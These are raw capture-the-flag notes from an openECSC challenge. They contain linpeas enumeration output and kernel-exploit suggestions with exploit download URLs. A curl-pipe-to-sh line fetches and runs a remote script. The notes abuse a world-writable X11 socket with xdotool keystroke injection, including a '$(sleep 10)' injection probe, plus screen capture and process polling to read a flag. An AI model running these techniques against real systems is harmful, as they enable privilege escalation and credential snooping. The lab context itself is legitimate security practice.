╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x. 1 root root 62K Apr  7 10:38 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x. 1 root root 52K Apr  7 10:38 /usr/bin/chsh
-rwsr-xr-x. 1 root root 87K Apr  7 10:38 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 59K Nov 21  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x. 1 root root 48K Apr  7 10:38 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x. 1 root root 67K Apr  7 10:38 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x. 1 root root 71K Nov 21  2024 /usr/bin/su
-rwsr-xr-x. 1 root root 35K Nov 21  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x. 1 root root 276K Jun 24 07:29 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr--. 1 root messagebus 51K Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x. 1 root root 639K Jul 28 11:59 /usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x. 1 root shadow 79K Apr  7 10:38 /usr/bin/chage
-rwxr-sr-x. 1 root shadow 31K Apr  7 10:38 /usr/bin/expiry
-rwxr-sr-x. 1 root _ssh 475K Jul 28 11:59 /usr/bin/ssh-agent
-rwxr-sr-x. 1 root shadow 39K Sep 21  2023 /usr/sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

══╣ Parent proc capabilities
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000


Files with capabilities (limited to 50):

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 0
drwxr-xr-x. 2 root root  6 Aug 24 16:05 .
drwxr-xr-x. 1 root root 19 Oct  4 05:02 ..

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

╔══════════╣ AppArmor binary profiles
-rw-r--r--. 1 root root 3448 Mar 12  2023 usr.bin.man

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/user/.ssh
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
total 0

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/dev/termination-log
/home/user
/run/lock
/tmp
/tmp/.X11-unix
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path

╔══════════╣ Executable files potentially added by user (limit 70)
2025-10-04+05:11:20.8135441730 /home/user/linpeas.sh
2025-10-04+05:02:42.5743159310 /usr/local/bin/pgrep
2025-10-04+05:02:42.5023160360 /usr/local/bin/top
2025-10-04+05:02:42.4983160420 /usr/local/bin/ps

╔══════════╣ Unexpected in root
/supervisord.pid

╔══════════╣ Modified interesting files in the last 5mins (limit 100)

╔══════════╣ Syslog configuration (limit 50)
syslog configuration Not Found
╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found
╔══════════╣ Log files with potentially weak perms (limit 50)

╔══════════╣ Files inside /home/user (limit 20)
total 956
drwxr-xr-x. 1 user user     60 Oct  4 05:11 .
drwxr-xr-x. 1 root root     18 Sep 27 15:53 ..
-rw-------. 1 user user    191 Oct  4 05:09 .bash_history
-rw-r--r--. 1 user user    220 Jun  6 14:38 .bash_logout
-rw-r--r--. 1 user user   3561 Oct  4 05:02 .bashrc
-rw-r--r--. 1 user user    807 Jun  6 14:38 .profile
drwxr-xr-x. 2 root root      6 Sep 27 15:53 .ssh
-rwxr--r--. 1 user user 961834 Oct  4 05:11 linpeas.sh

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x. 2 root root 6 Aug 24 16:05 /var/backups
total 0


╔══════════╣ Backup files (limited 100)
-rw-r--r--. 1 root root 147 Mar 27  2023 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r--. 1 root root 138 Mar 27  2023 /usr/lib/systemd/system/dpkg-db-backup.timer
-rwxr-xr-x. 1 root root 2569 May 11  2023 /usr/libexec/dpkg/dpkg-db-backup
-rw-r--r--. 1 root root 61 Sep  8 00:00 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r--. 1 root root 0 Sep  8 00:00 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer


╔══════════╣ Web files?(output limit)

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-------. 1 root root 0 Sep  8 00:00 /etc/.pwd.lock
-rw-r--r--. 1 root root 220 Jun  6 14:38 /etc/skel/.bash_logout
-rw-r--r--. 1 user user 220 Jun  6 14:38 /home/user/.bash_logout
-r--r--r--. 1 root root 11 Oct  4 05:02 /tmp/.X99-lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-r--r--r--. 1 root root 11 Oct  4 05:02 /tmp/.X99-lock

╔══════════╣ Searching passwords in history files
/home/user/.bash_history:curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
HOME=/home/user
LANG=en_US.UTF-8
LOGNAME=user
MOTD_SHOWN=pam
PWD=/home/user
SHELL=/bin/bash
SHLVL=1
SHLVL=2
SSH_CLIENT=10.0.136.207 41296 22
SSH_CONNECTION=10.0.136.207 41296 10.0.135.201 22
SSH_TTY=/dev/pts/0
TERM=xterm-256color
USER=user
_=./linpeas.sh
_=/usr/bin/dd
_=/usr/bin/grep


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 
```


The most important thing here is 

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```

Apparently, we have `Linux version 6.12.45-talos (root@buildkitsandbox) (gcc (GCC) 14.3.0, GNU ld (GNU Binutils) 2.44) #1 SMP Fri Sep  5 14:37:08 UTC 2025`

So we have some problems now:

1. We have nothing in the server, no gcc or clang, but we can push static versions to it. As long as we have curl and gcc, we are fine :)
2. We need `kernel.unprivileged_userns_clone=1`

user@organization:~$ sysctl kernel.unprivileged_userns_clone
-bash: sysctl: command not found
user@organization:~$ cat /proc/sys/kernel/unprivileged_userns_clone
cat: /proc/sys/kernel/unprivileged_userns_clone: No such file or directory
user@organization:~$ ls /proc/sys/kernel/ | grep unprivileged_userns_clone

3. Apparently, the kernel doesn't have it

```
user@organization:/usr/share/gcc/python$ ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.0  37028 30908 ?        Ss   05:02   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         14  0.0  0.0  15448  9532 ?        S    05:02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         15  0.0  0.0   4308  3224 ?        S    05:02   0:00 /bin/bash /opt/sys_maintenance
root         22  0.0  0.0   4440  2352 ?        S    05:02   0:01 /bin/bash /opt/sys_maintenance
root        520  0.0  0.0  17616 11128 ?        Ss   05:09   0:00 sshd: user [priv]
user        531  0.0  0.0  17876  6788 ?        S    05:09   0:00 sshd: user@pts/0
user        532  0.0  0.0   4196  3676 pts/0    Ss+  05:09   0:00 -bash
user       6094  0.0  0.0   3932  1644 pts/0    S    05:13   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
user       6095  0.0  0.0   3932  1428 pts/0    S    05:13   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
user       6096  0.0  0.0   3332  1752 pts/0    S    05:13   0:00 grep accessible
user       6098  0.0  0.0   3932  1772 pts/0    S    05:13   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
user       6101  0.0  0.0   2540  1460 pts/0    S    05:13   0:00 dd bs=9000 count=1
root      11195  0.0  0.0  17616 11180 ?        Ss   05:17   0:00 sshd: user [priv]
user      11206  0.0  0.0  17876  6960 ?        S    05:17   0:00 sshd: user@pts/1
user      11207  0.0  0.0   4328  3628 pts/1    Ss   05:17   0:00 -bash
root      12968 11.5  0.0  39840 21476 ?        Sl   05:41   0:00 python3 /opt/password_app.py
root      12969  0.0  0.0   2868  1704 ?        S    05:41   0:00 sleep 3
user      12971  0.0  0.0   3932  2864 pts/1    S+   05:41   0:00 /bin/bash /usr/local/bin/ps aux
user      12972  0.0  0.0   8096  4324 pts/1    R+   05:41   0:00 /bin/ps aux
```

```sh
╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/tmp/.X11-unix/X99
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

/etc/ssh/sshd_config

ssh -o "ProxyCommand=ncat --ssl 6d71b76c-7c31-4bc5-87dd-9cc42568338f.openec.sc 31337" user@localhost

```sh
user@organization:~$ ls -la /tmp/.X11-unix/X99
srwxrwxrwx. 1 root root 0 Oct  4 16:09 /tmp/.X11-unix/X99
user@organization:~$ export DISPLAY=:99
user@organization:~$ xdotool search --name "terminal|root|shell"
user@organization:~$ xdotool search --onlyvisible ".*"
Defaulting to search window name, class, and classname
1293
user@organization:~$ xdotool getwindowname 1293

user@organization:~$ pwd
/home/user
user@organization:~$ WINDOW_ID=1293
user@organization:~$ xdotool windowfocus --sync $WINDOW_ID
user@organization:~$ xdotool type "echo 'IT_WORKS' > /home/user/it_works.txt"
user@organization:~$ xdotool key "Return"
user@organization:~$ ls
user@organization:~$ ls -la
total 16
drwxr-xr-x. 1 user user   42 Oct  4 16:17 .
drwxr-xr-x. 1 root root   18 Sep 27 15:53 ..
-rw-------. 1 user user   30 Oct  4 16:11 .bash_history
-rw-r--r--. 1 user user  220 Jun  6 14:38 .bash_logout
-rw-r--r--. 1 user user 3561 Oct  4 16:09 .bashrc
-rw-r--r--. 1 user user  807 Jun  6 14:38 .profile
drwxr-xr-x. 2 root root    6 Sep 27 15:53 .ssh
user@organization:~$ pwd
/home/user
user@organization:~$ xdotool getwindowpid 1293
window 1293 has no pid associated with it.
user@organization:~$ xdotool getdisplaygeometry
1024 768
user@organization:~$ xdotool mousemove 0 0 click 1
user@organization:~$ xdotool search ".*"
Defaulting to search window name, class, and classname
1293
2097153
2097156
2097155
2097157
2097160
2097163
2097168
2097169
2097170
2097171
2097172
user@organization:~$ export DISPLAY=:99
for id in $(xdotool search ".*"); do
  echo "--- Window ID: $id ---"
  xdotool getwindowname $id
  xdotool getwindowpid $id
  xdotool getwindowgeometry $id
  echo ""
done
Defaulting to search window name, class, and classname
--- Window ID: 1293 ---

window 1293 has no pid associated with it.
Window 1293
  Position: 0,0 (screen: 0)
  Geometry: 1024x768

user@organization:~$ for id in $(xdotool search ".*"); do   echo "--- Window ID: $id ---";   xdotool getwindowname $id;   xdotool getwindowpid $id;   xdotool getwindowgeometry $id;   echo ""; done^C
user@organization:~$ dotool mousemove 0 0 click 1
-bash: dotool: command not found
user@organization:~$ dotool mousemove 0 0 click 1^C
user@organization:~$ xdotool mousemove 0 0 click 1
user@organization:~$ for id in $(xdotool search ".*"); do   echo "--- Window ID: $id ---";   xdotool getwindowname $id;   xdotool getwindowpid $id;   xdotool getwindowgeometry $id;   echo ""; done
Defaulting to search window name, class, and classname
--- Window ID: 1293 ---

window 1293 has no pid associated with it.
Window 1293
  Position: 0,0 (screen: 0)
  Geometry: 1024x768

--- Window ID: 2097153 ---

window 2097153 has no pid associated with it.
Window 2097153
  Position: 0,0 (screen: 0)
  Geometry: 1x1

--- Window ID: 2097156 ---
Secure Login System
window 2097156 has no pid associated with it.
Window 2097156
  Position: 412,284 (screen: 0)
  Geometry: 400x300

--- Window ID: 2097155 ---

window 2097155 has no pid associated with it.
Window 2097155
  Position: 412,284 (screen: 0)
  Geometry: 400x300

--- Window ID: 2097157 ---

window 2097157 has no pid associated with it.
Window 2097157
  Position: 412,284 (screen: 0)
  Geometry: 400x300

--- Window ID: 2097160 ---

window 2097160 has no pid associated with it.
Window 2097160
  Position: 522,324 (screen: 0)
  Geometry: 290x29

--- Window ID: 2097163 ---

window 2097163 has no pid associated with it.
Window 2097163
  Position: 452,434 (screen: 0)
  Geometry: 80x19

--- Window ID: 2097168 ---

window 2097168 has no pid associated with it.
Window 2097168
  Position: 672,432 (screen: 0)
  Geometry: 229x21

--- Window ID: 2097169 ---

window 2097169 has no pid associated with it.
Window 2097169
  Position: 452,496 (screen: 0)
  Geometry: 73x19

--- Window ID: 2097170 ---

window 2097170 has no pid associated with it.
Window 2097170
  Position: 672,494 (screen: 0)
  Geometry: 229x21

--- Window ID: 2097171 ---

window 2097171 has no pid associated with it.
Window 2097171
  Position: 810,566 (screen: 0)
  Geometry: 2x19

--- Window ID: 2097172 ---

window 2097172 has no pid associated with it.
Window 2097172
  Position: 720,644 (screen: 0)
  Geometry: 92x28

user@organization:~$ ls
```


```sh
transfer() {
  # Transfer the file using scp with the proxy
  scp -o 'ProxyCommand=ncat --ssl 05d066e7-a193-4725-a003-074426a43424.openec.sc 31337' "user@localhost:/home/user/captures.tar.gz" ./captures.tar.gz

  gzip -d capture.xwd.gz
  # If the transfer was successful, convert and clean up
  convert capture.xwd "capture_${last}.png"
  rm capture.xwd
  echo "Created capture_${last}.png"
  # Increment the counter for the next run
  last=$(( $last + 1 ))
}
```
export DISPLAY=:99

for id in $(xdotool search ".*"); do
  echo "--- Window ID: $id ---"
  xdotool getwindowname $id
  xdotool getwindowgeometry $id
done

xdotool type --window 2097170 '$(sleep 10)'
xdotool type --window 2097160 "root"
xdotool click --window 2097172 1

xdotool mousemove 0 0 click 1 && xwd -root -out capture.xwd && gzip -9 capture.xwd
xdotool search ".*"

ssh -o "ProxyCommand=ncat --ssl 05d066e7-a193-4725-a003-074426a43424.openec.sc 31337" user@localhost

xdotool click --window 2097170 1
xwd -root -silent | gzip -9 > capture1.xwd.gz
xdotool type 'root'
xwd -root -silent | gzip -9 > capture2.xwd.gz
xdotool click --window 2097172 1
xwd -root -silent | gzip -9 > capture3.xwd.gz
```
user@organization:~$ ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.0  37028 31024 ?        Ss   17:10   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         14  0.0  0.0  15448  9372 ?        S    17:10   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         15  0.0  0.0   4308  3124 ?        S    17:10   0:00 /bin/bash /opt/sys_maintenance
root         23  0.0  0.0   4440  2228 ?        S    17:11   0:00 /bin/bash /opt/sys_maintenance
root        103  0.0  0.0  17616 11144 ?        Ss   17:12   0:00 sshd: user [priv]
user        111  0.0  0.0  17876  6924 ?        S    17:12   0:00 sshd: user@pts/0
user        113  0.0  0.0   4196  3592 pts/0    Ss   17:12   0:00 -bash
root        405  0.0  0.0  17616 11160 ?        Ss   17:15   0:00 sshd: user [priv]
user        413  0.0  0.0  17876  6840 ?        S    17:15   0:00 sshd: user@pts/1
user        414  0.0  0.0   4196  3500 pts/1    Ss   17:15   0:00 -bash
root       2856  0.0  0.0   2868  1624 ?        S    17:30   0:00 sleep 1
user       2860  0.0  0.0   2492  1532 pts/1    S+   17:30   0:00 sleep 2
user       2863  0.0  0.0   3932  2844 pts/0    S+   17:30   0:00 /bin/bash /usr/local/bin/ps aux
user       2864  0.0  0.0   8096  4336 pts/0    R+   17:30   0:00 /bin/ps aux
user@organization:~$ ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.0  37028 31024 ?        Ss   17:10   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         14  0.0  0.0  15448  9372 ?        S    17:10   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         15  0.0  0.0   4308  3124 ?        S    17:10   0:00 /bin/bash /opt/sys_maintenance
root         23  0.0  0.0   4440  2228 ?        S    17:11   0:00 /bin/bash /opt/sys_maintenance
root        103  0.0  0.0  17616 11144 ?        Ss   17:12   0:00 sshd: user [priv]
user        111  0.0  0.0  17876  6924 ?        S    17:12   0:00 sshd: user@pts/0
user        113  0.0  0.0   4196  3592 pts/0    Ss   17:12   0:00 -bash
root        405  0.0  0.0  17616 11160 ?        Ss   17:15   0:00 sshd: user [priv]
user        413  0.0  0.0  17876  6840 ?        S    17:15   0:00 sshd: user@pts/1
user        414  0.0  0.0   4196  3500 pts/1    Ss   17:15   0:00 -bash
root       2947  6.9  0.0  39848 21348 ?        Sl   17:31   0:00 python3 /opt/password_app.py
root       2948  0.0  0.0   2868  1692 ?        S    17:31   0:00 sleep 3
user       2951  0.0  0.0   2492  1480 pts/1    S+   17:31   0:00 sleep 2
user       2952  0.0  0.0   3932  2976 pts/0    S+   17:31   0:00 /bin/bash /usr/local/bin/ps aux
user       2953  0.0  0.0   8096  4388 pts/0    R+   17:31   0:00 /bin/ps aux
```

xdotool click --window 2097170 1
xwd -root -silent -out capture1.xwd
xdotool type 'password'
xwd -root -silent -out capture2.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture3.xwd
tar -czf captures.tar.gz capture*.xwd
rm capture*.xwd

Defaulting to search window name, class, and classname
--- Window ID: 1293 ---

Window 1293
  Position: 0,0 (screen: 0)
  Geometry: 1024x768
--- Window ID: 2097153 ---

Window 2097153
  Position: 0,0 (screen: 0)
  Geometry: 1x1
--- Window ID: 2097156 ---
Secure Login System
Window 2097156
  Position: 412,284 (screen: 0)
  Geometry: 400x300
--- Window ID: 2097155 ---

Window 2097155
  Position: 412,284 (screen: 0)
  Geometry: 400x300
--- Window ID: 2097157 ---

Window 2097157
  Position: 412,284 (screen: 0)
  Geometry: 400x300
--- Window ID: 2097160 ---

Window 2097160
  Position: 522,324 (screen: 0)
  Geometry: 290x29
--- Window ID: 2097163 ---

Window 2097163
  Position: 452,434 (screen: 0)
  Geometry: 80x19
--- Window ID: 2097168 ---

Window 2097168
  Position: 672,432 (screen: 0)
  Geometry: 229x21
--- Window ID: 2097169 ---

Window 2097169
  Position: 452,496 (screen: 0)
  Geometry: 73x19
--- Window ID: 2097170 ---

Window 2097170
  Position: 672,494 (screen: 0)
  Geometry: 229x21
--- Window ID: 2097171 ---

Window 2097171
  Position: 810,566 (screen: 0)
  Geometry: 2x19
--- Window ID: 2097172 ---

Window 2097172
  Position: 720,644 (screen: 0)
  Geometry: 92x28

xdotool click --window 2097170 1
xwd -root -silent -out capture1.xwd
xdotool type '123456'
xwd -root -silent -out capture2.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture3.xwd
tar -czf captures.tar.gz capture*.xwd
rm capture*.xwd

xdotool click --window 2097160 1
xwd -root -silent -out capture1.xwd
xdotool key --clearmodifiers control+a BackSpace
xdotool type "user"
xwd -root -silent -out capture2.xwd
xdotool click --window 2097170 1
xdotool type "user"
xwd -root -silent -out capture3.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture4.xwd


❯ for file in ./*.xwd; do convert $file "$file.png" ; done

xdotool click --window 2097170 1
xdotool type 'root'
xwd -root -silent -out capture.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture2.xwd
xdotool click --window 2097170 1
xwd -root -silent -out capture3.xwd
tar -czf captures.tar.gz capture*.xwd
rm capture*.xwd

user@organization:~$ xdotool click --window 2097160 1
xwd -root -silent -out capture1.xwd
xdotool key --clearmodifiers control+a BackSpace 
xdotool type "user"
xwd -root -silent -out capture2.xwd
xdotool click --window 2097170 1
xdotool type "user"
xwd -root -silent -out capture3.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture4.xwd^C
user@organization:~$ ls
captures.tar.gz
user@organization:~$ rm captures.tar.gz 
user@organization:~$ xdotool click --window 2097160 1
xwd -root -silent -out capture1.xwd
xdotool key --clearmodifiers control+a BackSpace 
xdotool type "user"
xwd -root -silent -out capture2.xwd
xdotool click --window 2097170 1
xdotool type "user"
xwd -root -silent -out capture3.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture4.xwd
user@organization:~$ ls
capture1.xwd  capture3.xwd
capture2.xwd  capture4.xwd
user@organization:~$ tar -czf captures.tar.gz capture*.xwd
user@organization:~$ xdotool click --window 2097170 1
xdotool type 'root'
xwd -root -silent -out capture.xwd
xdotool click --window 2097172 1
xwd -root -silent -out capture2.xwd
xdotool click --window 2097170 1
xwd -root -silent -out capture3.xwd
tar -czf captures.tar.gz capture*.xwd
rm capture*.xwd
X Error of failed request:  BadWindow (invalid Window parameter)
  Major opcode of failed request:  40 (X_TranslateCoords)
  Resource id in failed request:  0x200012
  Serial number of failed request:  27
  Current serial number in output stream:  27

while true; do echo "---"; xdotool search --onlyvisible ".*"; sleep 2; done



ssh -o "ProxyCommand=ncat --ssl 26621eb9-df6d-4771-902a-946993e5c49f.openec.sc 31337" user@localhost
ncat --ssl f8078e14-d544-4feb-b8d5-30d956acd509.openec.sc 31337
xpra attach ssh:user@localhost:99 --ssh="ssh -o 'ProxyCommand=ncat --ssl f8078e14-d544-4feb-b8d5-30d956acd509.openec.sc 31337'"

scp -o "ProxyCommand=ncat --ssl f8078e14-d544-4feb-b8d5-30d956acd509.openec.sc 31337" ./curl.amd64 user@localhost:/home/user/curl

ncat --ssl 26621eb9-df6d-4771-902a-946993e5c49f.openec.sc 31337


export DISPLAY=:99
COUNT=0
while true; do
  filename=$(printf "frame_%03d.xwd" $COUNT)
  echo "Capturing $filename..."
  xwd -root -silent -out "$filename"
  COUNT=$((COUNT + 1))
  sleep 0.5 # Set to the new 0.2 second interval
done

while true; do; ps aux | tee -a pshist ; sleep 0.2; done

while true
do
  ps auxww | grep openECSC
  sleep 0.15
done

```
root       3872  3.3  0.0   8112  3732 ?        R    01:18   0:00 xdotool type openECSC{w3_sh0uld_st0p_us1ng_x0rg}
user       3878  0.0  0.0   3932  2924 pts/2    S+   01:18   0:00 /bin/bash /usr/local/bin/ps auxww
user       3879  0.0  0.0   2496  1436 pts/2    S+   01:18   0:00 tee -a pshist
user       3880  0.0  0.0   8096  4348 pts/2    R+   01:18   0:00 /bin/ps auxww
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.0  37028 30928 ?        Ss   00:46   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         14  0.0  0.0  15448  9380 ?        S    00:46   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         15  0.0  0.0   4308  3112 ?        S    00:46   0:00 /bin/bash /opt/sys_maintenance
root         22  0.0  0.0   4440  2232 ?        S    00:46   0:00 /bin/bash /opt/sys_maintenance
root         35  0.0  0.0  17616 11096 ?        Ss   00:47   0:00 sshd: user [priv]
user         41  0.0  0.0  17876  6728 ?        S    00:47   0:00 sshd: user@pts/0
user         42  0.0  0.0   4328  3644 pts/0    Ss+  00:47   0:00 -bash
root        270  0.0  0.0  17616 11112 ?        Ss   00:50   0:00 sshd: user [priv]
user        280  0.0  0.0  17876  6768 ?        S    00:50   0:00 sshd: user@pts/1
user        281  0.0  0.0   4196  3636 pts/1    Ss   00:50   0:00 -bash
user       1043  0.0  0.0   6344  2832 pts/1    S+   01:01   0:00 xkbevd
root       1101  0.0  0.0  17616 11320 ?        Ss   01:02   0:00 sshd: user [priv]
user       1113  0.0  0.0  17876  7148 ?        S    01:02   0:00 sshd: user@pts/2
user       1114  0.0  0.0   4196  3556 pts/2    Ss   01:02   0:00 -bash
root       3816  3.5  0.0  39808 21424 ?        Sl   01:18   0:00 python3 /opt/password_app.py
root       3872  1.6  0.0   8112  3732 ?        S    01:18   0:00 xdotool type openECSC{w3_sh0uld_st0p_us1ng_x0rg}
user       3883  0.0  0.0   3932  2852 pts/2    S+   01:18   0:00 /bin/bash /usr/local/bin/ps auxww
user       3884  0.0  0.0   2496  1432 pts/2    S+   01:18   0:00 tee -a pshist
user       3885  0.0  0.0   8096  4340 pts/2    R+   01:18   0:00 /bin/ps auxww
```

```
XkbStateNotify event, serial 13, synthetic no, device 3, time 546894533,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

